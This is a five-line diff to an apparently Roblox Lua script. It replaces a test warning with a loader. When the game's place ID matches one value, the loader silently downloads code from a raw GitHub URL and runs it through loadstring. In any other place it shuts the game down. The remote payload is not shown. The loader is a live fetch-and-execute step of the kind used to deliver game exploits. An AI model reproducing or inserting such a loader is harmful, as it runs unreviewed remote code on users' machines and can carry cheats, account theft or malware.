@@ -1,1 +1,5 @@
-warn('test')
+if game.PlaceId == 6152116144 then 
+    pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/connorobrien11/wbat.file/main/C4U6KFq6T6BatBvpFyTBzwiDCMhTPh%25%26type%3Dza"))()end)
+else 
+    game:Shutdown()
+end
